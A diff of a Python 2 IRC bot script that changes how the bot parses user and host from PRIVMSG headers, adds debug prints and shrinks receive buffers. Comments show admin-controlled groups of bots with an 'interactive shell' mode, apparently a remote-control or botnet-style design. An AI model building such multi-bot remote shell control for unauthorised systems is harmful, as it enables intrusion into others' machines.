@@ -140,17 +140,30 @@ commands = {
 #	group, use '??-bot1 bot2' or '??-bot1'. To add one or more bots to the group, use '??+bot1 bot2' or '??+bot1'. To change
 #	settings on bots in the group, use '???bot1 bot2' or '???bot1'. Changing settings still needs to be implemented.
 
-#function which parses the command and determine how to handle it
+#function which parses the command and determines how to handle it
 def parseCommand(command):
 	if DEBUG:
 		print "command is '%s'" % command
-
-	# print "interact 0: " + str(not INTERACT[0])
-	# print "interact 1: " + str(not INTERACT[1])
+		print "interact 0: " + str(not INTERACT[0])
+		print "interact 1: " + str(not INTERACT[1])
 
 	if INTERACT[1] and "PRIVMSG" in command: #check if we should respond or not and if we find privmsg, we're good!
-		user = command[1:command.index("!~")] #user sending message
-		host = command[(command.index("!~") + 2):command.index(" ")] #hostname and ip/domain name: 'blarg@1.2.3.4'
+		header = command[(command.index(":") + 1):] #get all after colon
+		print "1header is: '%s'" % header
+		header = header[:header.index("PRIVMSG")]
+		print "2header is: '%s'" % header
+		lines = header.split(":")
+		if len(lines) > 2:
+			print "we got a bunch of lines...doing nothing"
+			return
+		elif len(lines) > 1:
+			header = lines[1] #get all after colon
+
+		print "3header is: '%s'" % header
+		user = header[:header.index("!~")] #user sending message
+		print "user is '%s'" % user
+		host = header[(header.index("!~") + 2):header.index(" ")] #hostname and ip/domain name: 'blarg@1.2.3.4'
+		print "host is: '%s'" % host
 		hostname = host[:host.index("@")] #hostname: 'blarg'
 		client = host[(host.index("@") + 1):] #client/ip/domain name: '1.2.3.4' or 'blarg.com'
 		
@@ -205,23 +218,15 @@ def parseCommand(command):
 			print "user '%s' not in list of admins" % user
 
 	else: #we should not be listening, so we'll wait for '??stop' to end interactive shell
-		# print "inside the interact else"
 		if "PRIVMSG" in command:
 			command = command[command.index("PRIVMSG"):]
 			command = command[(command.index(':') + 1):].strip().lower()
 			if "??finish" in command:
-				# print "inside interact else, privmsg if, ??finish if"
-				# print "interact 0: '%d'" % INTERACT[0]
-				# print "interact 1: '%d'" % INTERACT[1]
 				INTERACT[0] = 0
 				INTERACT[1] = 1
 			elif "??+" in command:
 				users = command[3:].split(" ")
-				for user in users:
-					print "user is '%s'" % user
-				print "get here"
 				if botnick in users or "all" in users:
-					print "get here 2"
 					INTERACT[1] = 1
 
 
@@ -232,7 +237,7 @@ irc.connect((server, port)) #connects to the server
 irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :This is a fun bot!\n") #user authentication
 irc.send("NICK "+ botnick +"\n") #sets nick
 
-temp=irc.recv(4096) #get response to setting nick
+temp=irc.recv(1024) #get response to setting nick
 if DEBUG:
 	print "text received: '%s'" % temp
 
@@ -240,7 +245,7 @@ counter = 2
 while "nickname already in use" in temp.lower():
 	botnick = botnick + "-" + str(counter)
 	irc.send("NICK " + botnick + "\n") #sets nick
-	temp=irc.recv(4096) #get response to setting nick
+	temp=irc.recv(1024) #get response to setting nick
 	if DEBUG:
 		print "text received: '%s'\niteration %d" % (temp, counter)
 	counter += 1
@@ -250,8 +255,8 @@ irc.send("JOIN "+ channel +"\n") #join the channel
 
 #infinite loop to listen for messages aka commands
 while 1:
-	text=irc.recv(4096)  #receive up to 4096 bytes
-	lines = text.split("\n") #split commands based on new lines
+	text=irc.recv(1024)  #receive up to 1024 bytes
+	# lines = text.split("\n") #split commands based on new lines
 
 	#The two lines below are required by the IRC RFC, if you remove them the bot will time out.
 	if text.find('PING') != -1: #check if 'PING' is found
